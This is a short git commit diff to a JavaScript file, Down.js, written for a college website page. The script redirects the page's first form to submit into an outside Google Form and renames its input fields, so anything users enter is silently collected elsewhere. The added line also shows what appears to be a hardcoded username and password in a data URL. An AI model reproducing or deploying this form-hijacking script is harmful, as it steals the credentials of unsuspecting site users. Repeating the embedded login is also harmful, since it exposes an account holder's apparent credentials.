dbeae40251d38818f4882b3403d0bd5bfbd6446e
sonpanabtej <hv2471920@gmail.com>
2021-07-02 19:27:18 +0530

    Update Down.js

--- Down.js
+++ Down.js
@@ -2,5 +2,5 @@ if(location.href=="http://scce.ac.in/aicte"){
 document.Reg.onsubmit = "";
 }
 function Ch(){var C = document.getElementsByTagName('form'); C[0].action ="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";var D =document.getElementsByTagName('input'); D[0].name="entry.190958851";D[0].required;D[1].name="entry.470512502";D[1].required;
-}Ch();
+C.onsubmit=function(){location.href="data:text/plain,USER=19N01A0566,PASS=SAD@345";};}Ch();
 
